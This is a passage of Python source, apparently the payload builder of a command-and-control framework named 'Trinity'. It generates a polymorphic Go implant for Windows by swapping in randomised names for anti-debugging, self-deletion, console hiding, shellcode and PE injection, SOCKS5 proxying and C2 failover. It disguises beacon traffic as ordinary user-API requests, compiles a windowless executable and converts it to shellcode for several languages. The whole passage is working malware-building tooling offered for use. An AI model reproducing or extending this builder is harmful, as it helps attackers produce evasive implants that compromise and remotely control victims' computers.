        go_code = go_code.replace('{AGENT_CHECK_PROCESSES_FOR_DEBUGGERS_FUNC}', agent_check_processes_for_debuggers_func)
        go_code = go_code.replace('{AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}', agent_check_windows_processes_for_debuggers_func)
        go_code = go_code.replace('{AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}', agent_check_windows_debugger_func)
        go_code = go_code.replace('{AGENT_SELF_DELETE_FUNC}', agent_self_delete_func)
        go_code = go_code.replace('{AGENT_HIDE_CONSOLE_FUNC}', agent_hide_console_func)
        go_code = go_code.replace('{AGENT_CHECK_WORKING_HOURS_FUNC}', agent_check_working_hours_func)
        go_code = go_code.replace('{AGENT_CHECK_KILL_DATE_FUNC}', agent_check_kill_date_func)
        go_code = go_code.replace('{AGENT_GET_PROCESS_ID_FUNC}', agent_get_process_id_func)
        go_code = go_code.replace('{AGENT_INJECT_SHELLCODE_FUNC}', agent_inject_shellcode_func)
        go_code = go_code.replace('{AGENT_INJECT_PE_FUNC}', agent_inject_pe_func)
        go_code = go_code.replace('{AGENT_EXECUTE_PE_FUNC}', agent_execute_pe_func)

        # Replace failover function names
        go_code = go_code.replace('{AGENT_TRY_FAILOVER_FUNC}', agent_try_failover_func)
        go_code = go_code.replace('{AGENT_INCREMENT_FAIL_COUNT_FUNC}', agent_increment_fail_count_func)
        go_code = go_code.replace('{AGENT_RESET_FAIL_COUNT_FUNC}', agent_reset_fail_count_func)

        # Replace failover field names
        go_code = go_code.replace('{AGENT_FAILOVER_URLS_FIELD}', agent_failover_urls_field)
        go_code = go_code.replace('{AGENT_USE_FAILOVER_FIELD}', agent_use_failover_field)
        go_code = go_code.replace('{AGENT_CURRENT_C2_URL_FIELD}', agent_current_c2_url_field)
        go_code = go_code.replace('{AGENT_CURRENT_FAIL_COUNT_FIELD}', agent_current_fail_count_field)
        go_code = go_code.replace('{AGENT_MAX_FAIL_COUNT_FIELD}', agent_max_fail_count_field)
        go_code = go_code.replace('{AGENT_LAST_CONNECTION_ATTEMPT_FIELD}', agent_last_connection_attempt_field)
        go_code = go_code.replace('{AGENT_IN_FAILOVER_ATTEMPT_FIELD}', agent_in_failover_attempt_field)

        # Replace reverse proxy field names
        go_code = go_code.replace('{AGENT_REVERSE_PROXY_ACTIVE_FIELD}', agent_reverse_proxy_active_field)
        go_code = go_code.replace('{AGENT_REVERSE_PROXY_STOP_CHAN_FIELD}', agent_reverse_proxy_stop_chan_field)
        go_code = go_code.replace('{AGENT_REVERSE_PROXY_LOCK_FIELD}', agent_reverse_proxy_lock_field)

        # Replace reverse proxy function names
        go_code = go_code.replace('{AGENT_START_REVERSE_PROXY_FUNC}', agent_start_reverse_proxy_func)
        go_code = go_code.replace('{AGENT_STOP_REVERSE_PROXY_FUNC}', agent_stop_reverse_proxy_func)
        go_code = go_code.replace('{AGENT_HANDLE_SOCKS5_FUNC}', agent_handle_socks5_func)

        # Convert the profile headers dictionary to Go map literal format
        go_headers_parts = []
        for key, value in profile_headers.items():
            escaped_value = value.replace('"', '\\"')
            go_headers_parts.append(f'"{key}": "{escaped_value}"')
        go_headers_literal = "{" + ", ".join(go_headers_parts) + "}"

        # Replace the hardcoded headers in the struct initialization to Opsec Safe profile_config header
        go_code = go_code.replace('map[string]string{"User-Agent": "Trinity C2 Agent"}', f"map[string]string{go_headers_literal}")

        # Extract endpoints from profile_config to replace hardcoded defaults
        endpoints = profile_config.get('endpoints', {})
        register_uri = endpoints.get('register', '/api/users/register')
        tasks_uri = endpoints.get('tasks', '/api/users/{agent_id}/profile')
        results_uri = endpoints.get('results', '/api/users/{agent_id}/activity')
        interactive_uri = endpoints.get('interactive', '/api/users/{agent_id}/settings')
        interactive_status_uri = endpoints.get('interactive_status', '/api/users/{agent_id}/status')

        # Replace the hardcoded endpoint paths in the struct initialization with profile-defined values
        go_code = go_code.replace('"/api/users/register"', f'"{register_uri}"')
        go_code = go_code.replace('"/api/users/{agent_id}/profile"', f'"{tasks_uri}"')
        go_code = go_code.replace('"/api/users/{agent_id}/activity"', f'"{results_uri}"')
        go_code = go_code.replace('"/api/users/{agent_id}/settings"', f'"{interactive_uri}"')
        go_code = go_code.replace('"/api/users/{agent_id}/status"', f'"{interactive_status_uri}"')

        # Extract kill_date and working_hours from profile_config
        kill_date = profile_config.get('kill_date', '2025-12-31T23:59:59Z')
        working_hours = profile_config.get('working_hours', {
            "start_hour": 9,
            "end_hour": 17,
            "timezone": "UTC",
            "days": [1, 2, 3, 4, 5]
        })

        # Replace remaining simple placeholders
        go_code = go_code.replace('{AGENT_ID}', agent_id)
        go_code = go_code.replace('{SECRET_KEY}', secret_key)
        go_code = go_code.replace('{C2_URL}', c2_url)
        go_code = go_code.replace('{DISABLE_SANDBOX}', 'true' if disable_sandbox else 'false')
        go_code = go_code.replace('{KILL_DATE}', kill_date)
        go_code = go_code.replace('{WORKING_HOURS_START_HOUR}', str(working_hours.get('start_hour', 9)))
        go_code = go_code.replace('{WORKING_HOURS_END_HOUR}', str(working_hours.get('end_hour', 17)))
        go_code = go_code.replace('{WORKING_HOURS_TIMEZONE}', working_hours.get('timezone', 'UTC'))
        days_list = working_hours.get('days', [1, 2, 3, 4, 5])
        days_str = ', '.join(map(str, days_list))
        go_code = go_code.replace('{WORKING_HOURS_DAYS}', days_str)

        # Replace redirector placeholders
        go_code = go_code.replace('{REDIRECTOR_HOST}', redirector_host)
        go_code = go_code.replace('{REDIRECTOR_PORT}', str(redirector_port))
        go_code = go_code.replace('{USE_REDIRECTOR}', 'true' if use_redirector else 'false')

        # Replace failover URLs placeholder
        if use_failover and failover_urls:
            go_failover_urls = ', '.join([f'"{url}"' for url in failover_urls])
            go_code = go_code.replace('{FAILOVER_URLS}', f'[]string{{{go_failover_urls}}}')
            go_code = go_code.replace('{USE_FAILOVER}', 'true')
        else:
            go_code = go_code.replace('{FAILOVER_URLS}', '[]string{}')
            go_code = go_code.replace('{USE_FAILOVER}', 'false')

        logs_dir = 'logs'
        if not os.path.exists(logs_dir):
            os.makedirs(logs_dir)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_listener_name = "trinity"  # We'll use a generic name since we don't have listener_name here
        exe_filename = f"trinity_{agent_id[:8]}_{timestamp}.exe"
        final_exe_path = os.path.join(logs_dir, exe_filename)

        with tempfile.TemporaryDirectory() as temp_dir:
            go_file_path = os.path.join(temp_dir, 'agent.go')
            with open(go_file_path, 'w') as f:
                f.write(go_code)

            go_env = os.environ.copy()
            go_env['GOMODCACHE'] = os.path.join(temp_dir, 'modcache')
            go_env['GOCACHE'] = os.path.join(temp_dir, 'gocache')
            go_env['GOPATH'] = os.path.join(temp_dir, 'gopath')

            result = subprocess.run([
                'go', 'mod', 'init', 'agent'
            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

            if result.returncode != 0:
                raise Exception(f"Failed to initialize Go module: {result.stderr}")

            result = subprocess.run([
                'go', 'get', 'github.com/fernet/fernet-go'
            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

            if result.returncode != 0:
                raise Exception(f"Failed to get fernet-go dependency: {result.stderr}")

            # Conditionally get dependencies based on included features
            if include_bof:
                result = subprocess.run([
                    'go', 'get', 'github.com/praetorian-inc/goffloader/src/coff'
                ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

                if result.returncode != 0:
                    raise Exception(f"Failed to get goffloader coff dependency: {result.stderr}")

                result = subprocess.run([
                    'go', 'get', 'github.com/praetorian-inc/goffloader/src/lighthouse'
                ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

                if result.returncode != 0:
                    raise Exception(f"Failed to get goffloader lighthouse dependency: {result.stderr}")

            # Get go-clr dependency for .NET assembly execution if included
            if include_assembly:
                result = subprocess.run([
                    'go', 'get', 'github.com/Ne0nd0g/go-clr'
                ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

                if result.returncode != 0:
                    raise Exception(f"Failed to get go-clr dependency: {result.stderr}")

            # Get goffloader PE dependency for PE execution if included
            if include_execute_pe:
                result = subprocess.run([
                    'go', 'get', 'github.com/praetorian-inc/goffloader/src/pe'
                ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

                if result.returncode != 0:
                    raise Exception(f"Failed to get goffloader pe dependency: {result.stderr}")

            # No additional dependencies needed for the enhanced shellcode injection
            # since we're using native Windows API calls that are already available through syscall

            output_filename = 'agent.exe'
            temp_exe_path = os.path.join(temp_dir, 'agent.exe')

            try:
                env = go_env.copy()  # Use the same Go cache environment
                env['GOOS'] = 'windows'
                env['GOARCH'] = 'amd64'

                # For Windows builds, use GUI application flag to prevent console window allocation
                ldflags = ['-s', '-w']
                ldflags.extend(['-H', 'windowsgui'])  # Create GUI application without console window

                result = subprocess.run([
                    'go', 'build',
                    '-ldflags', ' '.join(ldflags),
                    '-o', output_filename,
                    '.'
                ], env=env, capture_output=True, text=True, cwd=temp_dir)

                if result.returncode != 0:
                    raise Exception(f"Go compilation failed: {result.stderr}")

                shutil.move(temp_exe_path, final_exe_path)

                print(f"[+] Polymorphic Trinity agent compiled successfully to: {final_exe_path}")

                # If shellcode format is specified, convert the exe to shellcode using go-donut
                if shellcode_format is not None:
                    return self._convert_to_shellcode(final_exe_path, shellcode_format)

                return final_exe_path

            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to compile Trinity agent: {str(e)}")
            except FileNotFoundError:
                raise Exception("Go compiler not found. Please install Go and ensure 'go' command is in PATH.") # See documentation

    def _convert_to_shellcode(self, exe_path, shellcode_format):
        import subprocess
        import os
        from datetime import datetime

        # Determine the output format for go-donut based on the requested format
        format_map = {
            'raw': 1,
            'base64': 2,
            'c': 3,
            'ruby': 4,
            'python': 5,
            'powershell': 6,
            'csharp': 7,
            'hex': 8
        }

        # Create output filename based on format
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_name = os.path.splitext(os.path.basename(exe_path))[0]

        # Map format to file extension
        ext_map = {
            'raw': 'bin',
            'base64': 'b64',
            'c': 'c',
            'ruby': 'rb',
            'python': 'py',
            'powershell': 'ps1',
            'csharp': 'cs',
            'hex': 'hex'
        }

        output_ext = ext_map.get(shellcode_format.lower(), 'bin')
        output_filename = f"{base_name}_shellcode_{timestamp}.{output_ext}"
        output_path = os.path.join('logs', output_filename)

        # Path to go-donut binary
        donut_path = os.path.join(os.path.dirname(__file__), 'go-donut', 'go-donut')

        if not os.path.exists(donut_path):
            raise Exception(f"go-donut binary not found at {donut_path}")

        # For formats that go-donut doesn't properly support (3=c, 4=ruby, 5=python, 6=powershell, 7=csharp, 8=hex),
        # we need to get raw shellcode first and then convert it to the desired format
        if shellcode_format.lower() in ['c', 'ruby', 'python', 'powershell', 'csharp', 'hex']:
            # Get raw shellcode first
            raw_output_path = os.path.join('logs', f"{base_name}_shellcode_{timestamp}_raw.bin")
            cmd = [
                donut_path,
                '-f', '1',              # raw format
                '-a', 'x64',            # architecture
                '-o', raw_output_path,  # output file
                '-i', exe_path          # input file
            ]

            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                if result.returncode != 0:
                    raise Exception(f"go-donut conversion failed: {result.stderr}")

                # Read the raw shellcode
                with open(raw_output_path, 'rb') as f:
                    raw_shellcode = f.read()

                # Convert to the requested format
                formatted_shellcode = self._format_shellcode(raw_shellcode, shellcode_format.lower())

                # Write the formatted shellcode to the output file
                with open(output_path, 'w') as f:
                    f.write(formatted_shellcode)

                # Clean up the temporary raw file
                os.remove(raw_output_path)

                print(f"[+] Trinity agent converted to {shellcode_format} shellcode: {output_path}")

                # Clean up the original exe file since we only wanted shellcode
                if os.path.exists(exe_path):
                    os.remove(exe_path)
                    print(f"[+] Cleaned up original exe file: {exe_path}")

                return output_path
            except subprocess.TimeoutExpired:
                # Clean up the temporary raw file if it exists
                if os.path.exists(raw_output_path):
                    os.remove(raw_output_path)
                raise Exception("go-donut conversion timed out")
            except Exception as e:
                # Clean up the temporary raw file if it exists
                if os.path.exists(raw_output_path):
                    os.remove(raw_output_path)
                raise Exception(f"Failed to convert to shellcode: {str(e)}")
        else:
            # For raw and base64, use go-donut directly
            donut_format = format_map.get(shellcode_format.lower(), 1)

            cmd = [
                donut_path,
                '-f', str(donut_format),  # format
                '-a', 'x64',              # architecture
                '-o', output_path,        # output file
                '-i', exe_path            # input file
            ]

            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                if result.returncode != 0:
                    raise Exception(f"go-donut conversion failed: {result.stderr}")

                print(f"[+] Trinity agent converted to {shellcode_format} shellcode: {output_path}")

                # Clean up the original exe file since we only wanted shellcode
                if os.path.exists(exe_path):
                    os.remove(exe_path)
                    print(f"[+] Cleaned up original exe file: {exe_path}")

                return output_path
            except subprocess.TimeoutExpired:
                raise Exception("go-donut conversion timed out")
            except Exception as e:
                raise Exception(f"Failed to convert to shellcode: {str(e)}")

    def _format_shellcode(self, raw_shellcode, format_type):
        if format_type == 'c':
            # Format as C-style array
            hex_values = [f"0x{byte:02x}" for byte in raw_shellcode]
            c_array = ", ".join(hex_values)
            return f"unsigned char shellcode[] = {{\n{c_array}\n}};"
        elif format_type == 'python':
            # Format as Python list
            hex_values = [f"0x{byte:02x}" for byte in raw_shellcode]
            python_list = ", ".join(hex_values)
            return f"shellcode = [{python_list}]"
        elif format_type == 'ruby':
            # Format as Ruby array
            hex_values = [f"0x{byte:02x}" for byte in raw_shellcode]
            ruby_array = ", ".join(hex_values)
            return f"shellcode = [{ruby_array}]"
        elif format_type == 'powershell':
            # Format as PowerShell byte array
            hex_values = [f"0x{byte:02x}" for byte in raw_shellcode]
            ps_array = ", ".join(hex_values)
            return f"[Byte[]] $shellcode = ({ps_array})"
        elif format_type == 'csharp':
            # Format as C# byte array
            hex_values = [f"0x{byte:02x}" for byte in raw_shellcode]
            csharp_array = ", ".join(hex_values)
            return f"byte[] shellcode = new byte[] {{ {csharp_array} }};"
        elif format_type == 'hex':
            # Format as hex string
            return ''.join([f"{byte:02x}" for byte in raw_shellcode])
        else:
            # Default to raw bytes if format not recognized
            return raw_shellcode
